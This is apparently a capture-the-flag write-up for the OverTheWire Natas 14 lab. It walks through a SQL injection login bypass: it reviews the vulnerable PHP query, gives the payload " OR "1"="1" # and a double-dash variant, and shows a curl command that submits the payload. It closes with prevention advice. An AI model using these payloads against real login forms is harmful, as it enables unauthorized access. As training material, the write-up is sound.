# Natas 14 → Natas 15

## Level Information

* URL: `http://natas14.natas.labs.overthewire.org`
* Username: `natas14`
* Password: `[REDACTED]`

## Goal

Find the password for the next level, `natas15`.

## Page Observation

When I opened the page, I saw a login form with two fields:

```text
Username:
Password:
```

There was also a link:

```text
View sourcecode
```

This suggests that the login logic may be visible in the source code.

## Concept

This level introduces SQL Injection.

SQL Injection happens when user input is directly inserted into an SQL query without proper validation or parameterized queries. If the application builds a SQL query by joining strings, an attacker can modify the query logic.

In this level, the login form can be bypassed by injecting SQL into the username field.

## Source Code Review

After clicking `View sourcecode`, I found that the application builds a query similar to this:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

The username and password are inserted directly into the SQL query.

This is unsafe because the user can inject SQL syntax into the input fields.

## Failed Attempt

At first, I tried a basic payload, but the page showed:

```text
Access denied!
```

The reason was that the password condition was still being checked.

To bypass the login properly, I needed to comment out the rest of the SQL query after making the username condition true.

## Payload Used

In the `Username` field, I entered:

```text
" OR "1"="1" #
```

In the `Password` field, I entered:

```text
test
```

## Vulnerability Explanation

The original SQL query is similar to:

```sql
SELECT * FROM users
WHERE username="[username]" AND password="[password]"
```

After entering the payload, the query becomes similar to:

```sql
SELECT * FROM users
WHERE username="" OR "1"="1" # " AND password="test"
```

The condition:

```sql
"1"="1"
```

is always true.

The `#` symbol comments out the rest of the SQL query, so the password check is ignored.

This allows the login check to be bypassed.

## Steps

1. Opened the Natas 14 page.
2. Clicked `View sourcecode`.
3. Reviewed the SQL query used for login.
4. Noticed that user input was inserted directly into the SQL query.
5. Entered this payload in the username field:

```text
" OR "1"="1" #
```

6. Entered any value in the password field:

```text
test
```

7. Clicked `Login`.
8. The login was bypassed.
9. The page displayed the password for `natas15`.

## Browser Method

Username:

```text
" OR "1"="1" #
```

Password:

```text
test
```

Submit the login form on:

```text
http://natas14.natas.labs.overthewire.org/
```

## Alternative Payload

If `#` does not work, another possible comment style is:

```text
" OR "1"="1" -- 
```

Important: there must be a space after `--`.

## Terminal Method

```bash
curl -u natas14:[REDACTED] \
--data-urlencode 'username=" OR "1"="1" #' \
--data-urlencode 'password=test' \
http://natas14.natas.labs.overthewire.org/
```

## Result

After submitting the SQL injection payload, the application bypassed the login check and displayed the password for `natas15`.

## Lesson Learned

User input should never be concatenated directly into SQL queries.

To prevent SQL Injection, developers should use prepared statements, parameterized queries, input validation, and least-privilege database permissions.

## Password

```text
[REDACTED]
```
